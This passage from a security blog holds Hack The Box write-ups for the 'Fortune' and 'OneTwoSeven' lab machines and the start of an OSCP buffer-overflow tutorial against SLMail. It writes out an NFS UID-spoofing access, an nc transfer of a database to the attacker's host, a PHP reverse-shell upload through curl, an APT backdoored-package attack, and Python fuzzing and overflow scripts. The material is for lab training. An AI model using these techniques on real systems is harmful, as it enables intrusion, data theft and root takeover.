same error. This is odd. What about a different browser then? How about \u0026ldquo;Chromium\u0026rdquo;? After disabling a feature of \u0026ldquo;Chromium\u0026rdquo; which prevents me from running it as root, I was greeted with a somewhat different message.\nSo I need a client certificate to view that page. Let\u0026rsquo;s check the filesystem again.\ndb=; ls -la /home/bob/ca drwxr-xr-x 7 bob bob 512 Oct 29 20:57 . drwxr-xr-x 5 bob bob 512 Nov 3 16:29 .. drwxr-xr-x 2 bob bob 512 Oct 29 20:44 certs drwxr-xr-x 2 bob bob 512 Oct 29 20:37 crl -rw-r--r-- 1 bob bob 115 Oct 29 20:56 index.txt -rw-r--r-- 1 bob bob 21 Oct 29 20:56 index.txt.attr -rw-r--r-- 1 bob bob 0 Oct 29 20:37 index.txt.old drwxr-xr-x 7 bob bob 512 Nov 3 15:37 intermediate drwxr-xr-x 2 bob bob 512 Oct 29 20:56 newcerts -rw-r--r-- 1 bob bob 4200 Oct 29 20:55 openssl.cnf drwx------ 2 bob bob 512 Oct 29 20:41 private -rw-r--r-- 1 bob bob 5 Oct 29 20:56 serial -rw-r--r-- 1 bob bob 5 Oct 29 20:37 serial.old This looks like progress. I downloaded all the certificates from \u0026ldquo;/home/bob/ca/intermediate\u0026rdquo; and created a client-certificate with \u0026ldquo;openssl\u0026rdquo;:\nopenssl pkcs12 -export -clcerts -in intermediate.cert.pem -inkey intermediate.key.pem -out client_cert.p12\nI imported it into \u0026ldquo;Chromium\u0026rdquo; and refreshed the page.\nA plain \u0026ldquo;HTML\u0026rdquo; site showed up saying:\nYou will need to use the local authpf service to obtain elevated network access. If you do not already have the appropriate SSH key pair, then you will need to \u0026lt;generate\u0026gt; one and configure your local system appropriately to proceed.\nCool! I clicked the \u0026ldquo;generate\u0026rdquo; link and was redirected to this new page.\nI created an \u0026ldquo;id_rsa\u0026rdquo; file for \u0026ldquo;ssh\u0026rdquo; and logged in.\nAccording to the \u0026ldquo;authpf\u0026rdquo; documentation there should be a new open port now. To make the discovery a bit quicker I used \u0026ldquo;masscan\u0026rdquo;\nmasscan -p1-65535,U:1-65535 10.10.10.127 --rate=5000 -e tun0\nAnd then \u0026ldquo;nmap\u0026rdquo; to check which port is our new target.\nnmap -p 2049,795,111 -sV -sC 10.10.10.127 PORT STATE SERVICE VERSION 111/tcp open rpcbind 2 (RPC #100000) 795/tcp open mountd 1-3 (RPC #100005) 2049/tcp open nfs 2-3 (RPC #100003) The \u0026ldquo;nfs\u0026rdquo; service was the most interesting service. Let\u0026rsquo;s see if there\u0026rsquo;s an open share for us!\n[Top]\nWeaponize # showmount -e 10.10.10.127 Export list for 10.10.10.127: /home (everyone) With showmount I was able to find an open share. To check it you might need to install some nfs-tools to do so. Google is your friend. :)\nmkdir fortune mount -o hard,nolock 10.10.10.127:/home fortune cd fortune ls -la drwxr-xr-x 5 root root 512 Nov 3 02:19 . drwxr-xr-x 3 root root 4096 Apr 21 13:56 .. drwxr-xr-x 5 1001 1001 512 Nov 3 21:29 bob drwxr-x--- 3 1000 1000 512 Nov 6 04:02 charlie drwxr-xr-x 2 1002 1002 512 Nov 3 03:39 nfsuser Bummer. We can\u0026rsquo;t access charlies folder. Or can we? When we check the UID/GUID we just see a number. What would happen when we create a new user with UID/GUID of 1000 on our own system?\n[Top]\nExploit # $ adduser hacker $ passwd hacker -\u0026gt; hacker $ nano /etc/passwd $ hacker:x:1000:1000::/home/hacker:/bin/sh $ su hacker $ cd /fortune/charlie $ ls mbox user.txt We\u0026rsquo;ve got user.txt and a mail! So I was able to bypass any Access Controls by mapping the share and creating a new user.\nHi Charlie,\nThanks for setting-up pgadmin4 for me. Seems to work great so far. BTW: I set the dba password to the same as root. I hope you don\u0026rsquo;t mind.\nCheers,\nBob\nTo make my life easier I added a propper ssh-key into charlies account. I just created a \u0026ldquo;ssh-key\u0026rdquo;, added the \u0026ldquo;public-key\u0026rdquo; to his \u0026ldquo;.ssh/authorized_keys\u0026rdquo; file and login into \u0026ldquo;ssh\u0026rdquo;.\nssh -i .ssh/id_rsa charlie@10.10.10.127\n[Top]\nInternal Recon # According to Bobs Email. He worked on \u0026ldquo;pgadmin4\u0026rdquo; let\u0026rsquo;s locate the database and see if we can mess with it.\nls -la /var/appserv/pgadmin4 -rw-r----- 1 _pgadmin4 wheel 118784 Nov 3 10:56 pgadmin4.db -rw-r----- 1 _pgadmin4 wheel 479 Nov 3 10:47 pgadmin4.ini I downloaded the database with this command on my \u0026ldquo;kali\u0026rdquo; box:\nnc -l -p 1337 \u0026gt; pgadmin4.db\nand on \u0026ldquo;fortune\u0026rdquo; I did:\nnc -w 3 10.10.14.4 1337 \u0026lt; pgadmin4.db\nI searched for an online database viewer and uploaded the database to explore its contents.\nThe most interesting tables were: \u0026ldquo;keys\u0026rdquo; and \u0026ldquo;users\u0026rdquo;\nbob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ [Top]\nPrivilege Escalation # According to the mail, the root password and the password for the database are the same. When I can crack the database password, I know the root password of the box. The question is: How do those hashes get generated?\nI checked the \u0026ldquo;github\u0026rdquo; repo of \u0026ldquo;pgadmin4\u0026rdquo;. After digging around for quite some time I found crypto.py which implements the password encryption part of pgadmin4.\nIn theory you are supposed to write a decryption script now. But while doing some research I found a halfway finished script online on pastebin. At this point I was working in this machine for about three days and I couldn\u0026rsquo;t be bothered to go through the coding process, knowing that it wouldn\u0026rsquo;t prevent my victory only delay it. So I grabbed the script and added the last bits and bobs.\nWhich was importing the crypto-lib from \u0026ldquo;github\u0026rdquo; and changing the propper values from the database.\nYou can find the finished script here: decrypt.py.\n[Top]\nRoot Flag # Running the script, decrypted the database password to R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!\nElevating my privilege with su - and the above password gave me access to root.\nfortune$ su - Password: fortune# id uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest) Another fun box down! :)\nAlso I got a new shiny badge for it!\n[Top]\n"},{"id":9,"href":"/posts/onetwoseven/","title":"OneTwoSeven - WriteUp","section":"Blog","content":" External Recon # I started with my usual \u0026ldquo;nmap\u0026rdquo; scan:\n$ nmap -sC -sV -oN initial 10.10.10.133 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) After this scan I \u0026ldquo;triple-tap\u0026rdquo; my target with a \u0026ldquo;script-\u0026rdquo; and a \u0026ldquo;all-ports-scan\u0026rdquo;. While the script-scan gave me no obvious further information to work with, the all-ports scan gave me another \u0026ldquo;port 60080 to work with.\nA quick scan told me it\u0026rsquo;s an unknown service and filtered.\nPORT STATE SERVICE VERSION 60080/tcp filtered unknown [Top]\nExplore # Since we just have one really interesting port to play with I focused on it. Opening \u0026ldquo;port 80\u0026rdquo; in my browser showed a website boosting their \u0026ldquo;secure\u0026rdquo; \u0026ldquo;SFTP\u0026rdquo; Service.\nFirst thing that stands out is that \u0026ldquo;admin\u0026rdquo; option in the menu. But it\u0026rsquo;s disabled and not clickable.\nA quick look into the source-code of the site reveals a comment for that \u0026ldquo;admin\u0026rdquo; option.\n\u0026lt;!-- Only enable link if access from trusted networks admin/20190212 --\u0026gt; \u0026lt;!-- Added localhost admin/20190214 --\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt;\u0026lt;a id=\u0026#34;adminlink\u0026#34; class=\u0026#34;nav-link disabled\u0026#34; href=\u0026#34;http://onetwoseven.htb:60080/\u0026#34;\u0026gt;Admin\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; This tells us something about that obscure port we found ealier. We can\u0026rsquo;t access the admin link from the \u0026ldquo;WAN\u0026rdquo;. But we\u0026rsquo;ve got a \u0026ldquo;DNS-Name\u0026rdquo; we can put into our hosts-file. From now on we access the website only by it\u0026rsquo;s \u0026ldquo;DNS-Name\u0026rdquo;.\nLet\u0026rsquo;s move on for now:\nThe \u0026ldquo;Statistics\u0026rdquo; option showed nothing that peeked my interest. So I moved on to check the \u0026ldquo;SignUp\u0026rdquo; button.\nWe jump to a \u0026ldquo;singup.php\u0026rdquo; site and get some login-credentials. Followed by some instructions how to use them.\nApperently I can upload files to: \u0026ldquo;sftp://onetwoseven.htb\u0026rdquo; and view them here: \u0026ldquo; http://www.onetwoseven.htb/~ots-iM2I4N2Q\". After login I found this setup:\nLet\u0026rsquo;s put some content on it, shall we?\nAs you can see, I tried uploading a \u0026ldquo;php-info.php\u0026rdquo; script into the root-directory but are not allowed to. After switching to the subdirectory the upload was successfull. Can we get code-execution?\nBummer. ;) Let\u0026rsquo;s try something else:\nOk. We are just not allowed to use php on the server. What now? I tried a couple of things at this point like:\nDirectory-Traversals Different types of executables like \u0026ldquo;asp\u0026rdquo; or \u0026ldquo;aspx\u0026rdquo;. (I test such things even when it\u0026rsquo;s a Linux server. You never know. ;) And of cause: \u0026ldquo;Symlinks\u0026rdquo;\nBingo! We can read local files. We just have two entries. One is us. And one is well - someone else. Let\u0026rsquo;s ignore (but keep in mind) that the other user has a \u0026ldquo;127.0.0.1\u0026rdquo; in his entry.\nBut what-else can we read? Maybe folders?\nHell yeah! (Don\u0026rsquo;t be mistaken here. This looks straight forward now. But it took me quite some time to figure that out.) I systematically went through all folders manually to check it\u0026rsquo;s contents. Most folder weren\u0026rsquo;t accessible to me though.\nHowever one file was indeed the next step forward. The \u0026ldquo;login.php.swp\u0026rdquo; file.\nThe file looked like some sort of temporary file. And wasn\u0026rsquo;t readable by a normal text-editor. So I ran strings against it to get as much stuff out of there as possible. Which actually was quite successful if you ask me. ;)\nWith the the found hash I went to an online-hashcrack-website to see if it\u0026rsquo;s a known hash.\nSure enough we get a username \u0026ldquo;ots-admin\u0026rdquo; and password Homesweethome1. But for what service? I tried to login to \u0026ldquo;SFTP\u0026rdquo; but get a \u0026ldquo;permission denied\u0026rdquo;.\nRemember that \u0026ldquo;admin\u0026rdquo; option? It\u0026rsquo;s time check it \u0026hellip;.. somehow.\n[Top]\nWeaponize # Let\u0026rsquo;s recap what we know and have.\n\u0026ldquo;admin panel\u0026rdquo; accessible from \u0026ldquo;localhost\u0026rdquo; \u0026ldquo;admin credentials\u0026rdquo; to probably that \u0026ldquo;admin panel\u0026rdquo; \u0026ldquo;SFTP\u0026rdquo; access with normal user /etc/passwd (wink wink) But how can we trick the server thinking we are \u0026ldquo;localhost\u0026rdquo;? Let\u0026rsquo;s BECOME \u0026ldquo;localhost\u0026rdquo; by using our access to build a \u0026ldquo;ssh-tunnel\u0026rdquo;.\nssh -N -L 80:127.0.0.1:80 ots-iM2I4N2Q@10.10.10.133\nand then accessing the Website again via \u0026ldquo;127.0.0.1\u0026rdquo;.\nAs you see we can now can access the \u0026ldquo;admin panel\u0026rdquo;. But before doing that - Do you remember that user with \u0026ldquo;127.0.0.1\u0026rdquo; in his entry? We are now \u0026ldquo;127.0.0.1\u0026rdquo;. Think a second what this implies. :)\nOk. Got it? No? No worries - it took me a while to get that part myself. We have access to his \u0026ldquo;SFTP\u0026rdquo; account now. How?\nWell - take a look at the \u0026ldquo;SignUp\u0026rdquo; Page.\nWe come from \u0026ldquo;127.0.0.1\u0026rdquo; therefore the application thinks we are him and present us the password. But before we can use the credentials we need to make sure we are comming from \u0026ldquo;127.0.0.1\u0026rdquo; for the \u0026ldquo;SFTP\u0026rdquo; service aswell. Our present tunnel is just for \u0026ldquo;port 80\u0026rdquo; not \u0026ldquo;port 22\u0026rdquo;.\nssh -N -L 22:127.0.0.1:22 ots-iM2I4N2Q@10.10.10.133\nOh - there\u0026rsquo;s the user.txt. That was unexpected right? We can now focus to get access to that box. Although the \u0026ldquo;admin-panel\u0026rdquo; links is now clickable - we can\u0026rsquo;t access the site right away because it\u0026rsquo;s listening on \u0026ldquo;port 60080\u0026rdquo;. Yep - you guest it. Another \u0026ldquo;tunnel\u0026rdquo; is needed.\nssh -N -L 60080:127.0.0.1:60080 ots-iM2I4N2Q@10.10.10.133\nI used the credentials we cracked earlier. But as you can see - there\u0026rsquo;s a disabled upload button again. We can just enable it in the sourcecode.\nBut because we might want to upload something over and over again - it would be a time saver to do it with \u0026ldquo;curl\u0026rdquo;.\n[Top]\nExploit # In order to build my \u0026ldquo;curl\u0026rdquo; query I started \u0026ldquo;Burp\u0026rdquo; to see how the request would look like and what \u0026ldquo;cookie\u0026rdquo; value I need to send over.\nAn alternative and simpler way is to use the \u0026ldquo;developer-tools\u0026rdquo; of your browser to get the cookie.\nAfter some trial and error I came up with the following command:\ncurl -H \u0026#39;Cookie: PHPSESSID=immqdajjjet662lm9qctfrt7h3\u0026#39; -H \u0026#39;Host: onetwoseven.htb\u0026#39; --form \u0026#39;addon=@/root/HTB/Boxes/OneTwoSeven/ots-shell.php\u0026#39; \u0026#39;http://127.0.0.1:60080/addon-download.php?addon=/addon-upload.php\u0026#39; -vvv This article was very helpful if you want to learn more.\nAfter uploading a simple \u0026ldquo;php-reverse-shell\u0026rdquo;, we can open a \u0026ldquo;ncat\u0026rdquo; session and launch our \u0026ldquo;reverse-shell\u0026rdquo; and doing our cli-magic after receiving it.\n[Top]\nPrivilege Escalation # This write-up is already getting very long. So I come right to the meat of the \u0026ldquo;PrivEsc\u0026rdquo;. When doing proper post-exploitation-recon one command should not be missed: sudo -l.\nAlso this time it reveals what our target is.\nenv_reset, env_keep+=\u0026#34;ftp_proxy http_proxy https_proxy no_proxy\u0026#34;,mail_badpass, User www-admin-data may run the following commands on onetwoseven: (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade Our user (\u0026ldquo;www-data\u0026rdquo;) is allowed to update the system and he has also the right to set the http_proxy environment-variable.\nHow does a upgrade look like right now?\nsudo apt-get update Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease Temporary failure resolving \u0026#39;packages.onetwoseven.htb\u0026#39; \u0026lt;------ Err:2 http://de.deb.devuan.org/merged ascii InRelease Temporary failure resolving \u0026#39;de.deb.devuan.org\u0026#39; Err:3 http://de.deb.devuan.org/merged ascii-security InRelease Temporary failure resolving \u0026#39;de.deb.devuan.org\u0026#39; Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease Temporary failure resolving \u0026#39;de.deb.devuan.org\u0026#39; Reading package lists... This is the last missing bit. Because \u0026ldquo;APT\u0026rdquo; tries to resolve \u0026ldquo;packages.onetwoseven.htb\u0026rdquo; we can high-jack that request. Which in turn means, we can install a malicious package as root. I\u0026rsquo;ll put a couple of links at the end for further reference on this topic.\nThe steps and network setup are roughly these:\n1. Backdoor APT-Package 2. Set http_proxy to attacker-proxy 3. Redirect traffic from attacker-proxy to attack-webserver 4. Rebuild APT-Repository 5. Open a Reverse-Shell listener 6. Start upgrade 7. root! \u0026lt;Victim\u0026gt; ---- [http_proxy=attacker:4444] ---- \u0026lt;4444:attacker:5555\u0026gt; ---- \u0026lt;5555:attacker-webserver\u0026gt; ---- [APT-Repository] As you can see from the next screenshots I backdoored \u0026ldquo;nano\u0026rdquo;. Just download \u0026ldquo;nano\u0026rdquo; from the repository and run:\ndpkg-deb -R nano.deb nano_output\nThen add a post-install script and repack everything and build a repository.\nThis is how my folders were setup:\nYes, I did that manually. Which was painful, but worked. I later learned about reprepo from xct\u0026rsquo;s WriteUp. A very simple tool for such things. In fact, I used this for this Write-up too. First because I want to try it myself. Second because my VPN-IP changed, so my \u0026ldquo;backdoored nano package\u0026rdquo; wasn\u0026rsquo;t working anymore. I couldn\u0026rsquo;t be bothered to go through the process of getting the signatures and hashes right again. It obviously has NOTHING to do with crappy note-taking for this part\u0026hellip;..\nIf you would like to roll your own repo for this, you could watch watch ippsec\u0026rsquo;s video.\nLet\u0026rsquo;s setup \u0026ldquo;Burp\u0026rdquo; and \u0026ldquo;http_proxy\u0026rdquo;:\nexport http_proxy='http://10.10.14.32:4444'\nMake sure \u0026ldquo;Intercept\u0026rdquo; is off.\n[Top]\nRoot Flag # After running an update we see hits on our webserver. And after an upgrade we can install our backdoored \u0026ldquo;nano\u0026rdquo; and get a \u0026ldquo;root-shell\u0026rdquo;.\nOne of my favorite boxes so far! :) See you next time.\n[Top]\nAdditional Ressoures:\nAPT-Mitm-Package-Injection APT-PrivEsc Create-Signed-APT-Repo "},{"id":10,"href":"/posts/oscp-exploitdev/","title":"Path to OSCP - Exploit Development","section":"Blog","content":" Topic # I want to take the OSCP exam in 2020.\nWith this blog-series I want to motivate myself, document my progress and give back to the community. It also might encourage you to take the exam yourself.\nIn this first installment I would like to talk about \u0026ldquo;Buffer-Overflows\u0026rdquo;. What are they? How do they work? How can you exploit them?\nI am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language. I just know a bit of \u0026ldquo;Python3\u0026rdquo; and \u0026ldquo;PowerShell\u0026rdquo;. But I managed to pull this of anyway and so can you.\nIf you are a more experienced wizard and you find some mistakes in my explanation, let me know so I can fix it here and learn faster!\nLet\u0026rsquo;s start!\nSetup # My setup for this task consisted of a \u0026ldquo;Windows 10 64Bit VM\u0026rdquo; and a \u0026ldquo;Kali Linux VM\u0026rdquo; in \u0026ldquo;VirtualBox\u0026rdquo;. This part should be straight forward for you. Just install both operating systems and make sure that the VMs can \u0026ldquo;ping\u0026rdquo; each other. Take note about the \u0026ldquo;IP Addresses\u0026rdquo; of the systems. We need those shortly.\nNext I installed \u0026ldquo;SLMail 5.5.0\u0026rdquo; on the \u0026ldquo;Windows 10 VM\u0026rdquo; as our target. If you want to follow this writeup you can get it here. Also take note of the title of the exploit: \u0026ldquo;POP3 \u0026lsquo;PASS\u0026rsquo; Remote Buffer Overflow\u0026rdquo;.\nI also installed \u0026ldquo;OllyDbg\u0026rdquo; for my debugging needs. I suggest to give \u0026ldquo;Immunity-Debugger\u0026rdquo; or \u0026ldquo;x64dbg\u0026rdquo; a try too, \u0026ldquo;OllyDbg\u0026rdquo; worked but doesn\u0026rsquo;t seem to be the first choice of more advanced exploit-devs.\nOpen \u0026ldquo;services.mmc\u0026rdquo; as \u0026ldquo;administrator\u0026rdquo; on your \u0026ldquo;Windows VM\u0026rdquo; just to be prepared to restart the \u0026ldquo;SLMail\u0026rdquo; service. It will crash a couple of times during this journey.\nWith this, we should have everything setup.\nRecon # I logged into my \u0026ldquo;Kali VM\u0026rdquo; and opened \u0026ldquo;nmap\u0026rdquo; and scanned the IP-Address of my \u0026ldquo;Windows VM\u0026rdquo;. Besides a couple of standard Windows ports I found \u0026ldquo;port 110\u0026rdquo; to be open as well.\nThis just means \u0026ldquo;SLMail\u0026rdquo; is running and is listening on \u0026ldquo;port 110\u0026rdquo; for incoming connections. As the name and port suggest, \u0026ldquo;SLMail\u0026rdquo; is a small local \u0026ldquo;mailserver\u0026rdquo; providing the user access to their mailbox via the \u0026ldquo;POP3\u0026rdquo; protocol.\nIf you are not familiar with this protocol you should at least read the Wikipedia entry for this. As the title of the exploit suggests the vulnerability resides in the PASS parameter. This parameter or command is part of the authentication phase like when someone logs into their mailbox. It\u0026rsquo;s used to tell the \u0026ldquo;POP3\u0026rdquo; server that you will send him your password now.\nThis is how the authentication looks like:\nC: USER x41 S: +OK User accepted C: PASS SuperSecurePassword S: +OK Pass accepted You can try this with \u0026ldquo;nc\u0026rdquo; too.\nTo recap this phase:\nWe identified that \u0026ldquo;POP3\u0026rdquo; is running correctly on the \u0026ldquo;Windows VM\u0026rdquo;. We can send data to the service as well. You\u0026rsquo;ll see why this is important shortly. Because this is a demo we also know that the PASS command is vulnerable to a \u0026ldquo;BufferOverflow\u0026rdquo;. If we wouldn\u0026rsquo;t know that, we simply would do the next step for other parts of the application where \u0026ldquo;user input\u0026rdquo; is possible.\nFuzzing # At some point a developer wrote the \u0026ldquo;POP3\u0026rdquo; server in programming language like \u0026ldquo;C\u0026rdquo;. In those languages the developer is responsible to tell the computer how much data a variable is allowed to store. For example: The variable \u0026ldquo;UserPassword\u0026rdquo; is allowed to take \u0026ldquo;100 Bytes\u0026rdquo;. If someone would have a very long password of let\u0026rsquo;s say \u0026ldquo;101 Bytes\u0026rdquo;. The application would truncate that because the \u0026ldquo;buffer\u0026rdquo; is too small.\nThis is how it should be. If the developer forgets to be restrictive however, the application would happily accept the \u0026ldquo;101 Byte\u0026rdquo; long password. Nothing prevents you to send even more data: \u0026ldquo;200 Bytes\u0026rdquo;, \u0026ldquo;2000 Bytes\u0026rdquo; - the application will take it and puts all this data into it\u0026rsquo;s memory. At some point however, it will crash because you have overwritten vital parts of the application itself. We will see this in action shortly. For now we just need to know how much data we need to send the \u0026ldquo;POP3\u0026rdquo; service until it crashes.\nTo accomplish that I wrote a small script that connects to the \u0026ldquo;POP3\u0026rdquo; service, sends the USER command with a username as shown in the last phase and then the PASS command with junk data. For simplicity I choose the letter \u0026ldquo;A\u0026rdquo;. Please check the comments in the code to get an overview of what it does:\n#!/usr/bin/python3 # Import of the socket library to connect to the POP3 service # Import time to sleep 2 seconds to avoid Denial of Service import socket import time # Victim IP and Port host = \u0026#34;192.168.1.14\u0026#34; port = 110 # A counter variable to keep track of the amount of \u0026#39;A\u0026#39;s we will sent counter = 1000 # Loop until we\u0026#39;ve reached 5000 Bytes (5000 is just a guess - could be more, could be less) while (counter \u0026lt; 5000): # Build a TCP SOCKET (stream) and use it to connect to victim IP \u0026amp; Port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) data = s.recv(1024) print(data) # Send USER command with Username x41 s.send(b\u0026#39;USER x41\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Send PASS command with \u0026#39;A\u0026#39; times the value of the counter variable (starts at 1000) s.send(b\u0026#39;PASS \u0026#39; + b\u0026#39;A\u0026#39; * counter + b\u0026#39;\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Close connection s.close() # Sleep 2 seconds and add 100 to the counter variable time.sleep(2) counter += 100 # Print the buffersize we\u0026#39;ve sent - this is important because we want to know at how many bytes the application will crash print(\u0026#34;[+] Buffersize {}\u0026#34;.format(counter)) Before we can start using our script, let\u0026rsquo;s attach (File -\u0026gt; Attach) \u0026ldquo;OllyDbg\u0026rdquo; (run it as administrator) to the \u0026ldquo;SLMail\u0026rdquo; process and hit the \u0026ldquo;run\u0026rdquo; button.\nWhile \u0026ldquo;OllyDbg\u0026rdquo; is now monitoring the process, we can start the \u0026ldquo;Fuzzer\u0026rdquo;.\nThe screenshot shows the server banner, then the User welcome notification. Followed by an error (which we can ignore) and then prints the sent buffersize of \u0026ldquo;4600 bytes\u0026rdquo;. This is repeated three times for this example and stops just before we get the output for \u0026ldquo;4800 bytes\u0026rdquo;.\nOn our \u0026ldquo;Windows VM\u0026rdquo; we can also see in \u0026ldquo;OllyDbg\u0026rdquo; that something went wrong.\nLet\u0026rsquo;s zoom in a bit at take a look at the different windows and their content. On the right hand-side you can the \u0026ldquo;registers\u0026rdquo; of the \u0026ldquo;CPU\u0026rdquo;. \u0026ldquo;Registers\u0026rdquo; are small units of memory within the \u0026ldquo;CPU\u0026rdquo; itself.\nThe \u0026ldquo;CPU\u0026rdquo; loads data from \u0026ldquo;RAM\u0026rdquo; into those \u0026ldquo;registers\u0026rdquo; and then processes the data. We are just interessted in two \u0026ldquo;registers\u0026rdquo; right now. \u0026ldquo;EIP\u0026rdquo; and \u0026ldquo;ESP\u0026rdquo; (the latter is highlighted).\n\u0026ldquo;EIP\u0026rdquo; is the \u0026ldquo;Extented Instruction Pointer\u0026rdquo;. It tells the \u0026ldquo;CPU\u0026rdquo; where it needs to go after it is done with the current operation. Currently it is pointing to the memory-location of 41414141.\n\u0026ldquo;ESP\u0026rdquo; is the \u0026ldquo;Extented Stack Pointer\u0026rdquo;. It always points to the top of the \u0026ldquo;stack\u0026rdquo;. In this example the top of the \u0026ldquo;stack\u0026rdquo; is located at 0193A101.\nWtf is the \u0026ldquo;stack\u0026rdquo;? We can see the \u0026ldquo;stack\u0026rdquo; in the bottom-right corner.\nIt is basicly just the \u0026ldquo;RAM\u0026rdquo; allocated for the \u0026ldquo;SLMail\u0026rdquo; process. The screenshot shows that the content of the \u0026ldquo;stack\u0026rdquo; at that location is also \u0026ldquo;41\u0026rsquo;s\u0026rdquo;. It also shows, what \u0026ldquo;41\u0026rdquo; means. It\u0026rsquo;s our character \u0026ldquo;A\u0026rdquo; we have sent in \u0026ldquo;hex\u0026rdquo; notation.\nOur \u0026ldquo;A\u0026rsquo;s\u0026rdquo; have overwritten \u0026ldquo;EIP\u0026rdquo; and crashed to program.\nThis is proof that we have a \u0026ldquo;BufferOverflow\u0026rdquo; here. But before we move on - I need to explain how we overwrote \u0026ldquo;EIP\u0026rdquo; and what happened in the background.\nIt\u0026rsquo;s rather simple. We provided more input than the application was able to handle, filling the normal buffer, overflowing into unknown space until we have overwritten so much that we destroyed the location where the application stored the \u0026ldquo;return\u0026rdquo; address. This address will be loaded into \u0026ldquo;EIP\u0026rdquo; after we provided our \u0026ldquo;password\u0026rdquo;.\nThe \u0026ldquo;return\u0026rdquo; address is the location where the application under normal circumstances would continue it\u0026rsquo;s operation. In this case probably doing a check if the provided user and password is correct. But because we overwrote the \u0026ldquo;return address\u0026rdquo; with 41414141 (an invalid address) the program crashes.\nThis in turn means two things:\nWe control \u0026ldquo;EIP\u0026rdquo; and could also write valid addresses into it - allowing us to jump to a memory location of our choosing. We can put our own code on the stack, like a reverse shell, which we can run by jumping to it. Some pictures would be nice now right? I didn\u0026rsquo;t want to steal others work, so I just link some here. They used a different tool for their example on \u0026ldquo;BufferOverflows\u0026rdquo;. You could use theirs to test what you\u0026rsquo;ve learned here. I did the same. I only started with their binary first as a try run and then popped a shell on the \u0026ldquo;POP3\u0026rdquo; server on my own. Anyway\u0026hellip;.\nLet\u0026rsquo;s write a proof of concept \u0026ldquo;exploit\u0026rdquo; now.\nPOC # We can copy our \u0026ldquo;Fuzzer\u0026rdquo; and remove everything but the connection code. We need to add now a couple of things. First we need to find out how many bytes we need to send exactly to the application till we overwrite \u0026ldquo;EIP\u0026rdquo;. In our \u0026ldquo;fuzzing\u0026rdquo; phase we learned that it should be something between \u0026ldquo;4600\u0026rdquo; and \u0026ldquo;4800\u0026rdquo; bytes.\nWe can use the tool pattern_create to generate a \u0026ldquo;5000 byte\u0026rdquo; long string with a unique pattern. 5000 just to have some wiggle-room.\nThen we copy this string over to our \u0026ldquo;exploit\u0026rdquo;. Replace the \u0026ldquo;\u0026lt; PATTERN_HERE \u0026gt;\u0026rdquo; section.\n#!/usr/bin/python3 # Import of the socket library to connect to the POP3 service import socket # Victim IP and Port host = \u0026#34;192.168.1.14\u0026#34; port = 110 # POC Buffer buffer = b\u0026#39; \u0026lt;PATTERN_HERE\u0026gt; \u0026#39; # Build a TCP SOCKET (stream) and use it to connect to victim IP \u0026amp; Port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) data = s.recv(1024) print(data) # Send USER command with Username x41 s.send(b\u0026#39;USER x41\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Send PASS command with our buffer s.send(b\u0026#39;PASS \u0026#39; + buffer + b\u0026#39;\\r\\n\u0026#39;) data = s.recv(1024) print(data) # Close connection s.close() The program crashes instantly. We can copy now the value of \u0026ldquo;EIP\u0026rdquo; from \u0026ldquo;OllyDbg\u0026rdquo; and give it a tool called pattern_offset. This tool can now calculate at which position in the created pattern this value is found.\nWe can update our code again to test if the calculated value is correct. We just send a crafted \u0026ldquo;buffer\u0026rdquo; again.\n# POC Buffer buffer = b\u0026#39;A\u0026#39; * 4654 buffer += b\u0026#39;B\u0026#39; * 4 buffer += b\u0026#39;C\u0026#39; * 342 If this works, we would expect the following: The \u0026ldquo;stack\u0026rdquo; should hold a ton of \u0026ldquo;A\u0026rsquo;s\u0026rdquo;, \u0026ldquo;EIP\u0026rdquo; should hold 4 \u0026ldquo;B\u0026rsquo;s\u0026rdquo; and those are followed by 342 \u0026ldquo;C\u0026rsquo;s\u0026rdquo;. Let\u0026rsquo;s try that. (Keep in mind - you might need to restart the \u0026ldquo;SLMail\u0026rdquo; service.)\nAnd indeed it worked. The next step in our process is to find so called \u0026ldquo;bad characters\u0026rdquo;.\nBadChars # \u0026ldquo;BadChars\u0026rdquo; are bytes that the application can\u0026rsquo;t handle and would break our exploit. A prime example are so called \u0026ldquo;null bytes\u0026rdquo; or \\x00. A \u0026ldquo;null byte\u0026rdquo; is most often used to terminate a string in programming languages. In other words: It will truncate everything after the \u0026ldquo;null byte\u0026rdquo;.\nFinding them is easy but repetitive task. We swap our \u0026ldquo;C\u0026rsquo;s\u0026rdquo; with all possible bytes from \\x00 till \\xff and see which break the program. When we found one, we\u0026rsquo;ll remove it from the list, and try again. And again. And again.\nAfter the first run, we see nothing on the \u0026ldquo;stack\u0026rdquo;. So we found our first \u0026ldquo;badchar\u0026rdquo; \\x00.\nSo we remove it and try again. This time we can find the sequence 01,02,03... on the \u0026ldquo;stack\u0026rdquo;. But it breaks again at \\x0a, and a third time at \\x0d. After finding all the \u0026ldquo;BadChars\u0026rdquo; the \u0026ldquo;stack\u0026rdquo; should look like this:\nWith this knowledge we can move into the next phase. Creating our \u0026ldquo;shellcode\u0026rdquo;.\nShellcode # \u0026ldquo;Shellcode\u0026rdquo; is basicly a synonym for \u0026ldquo;payload\u0026rdquo;. It can be anything you want. For this we want to spawn a simple 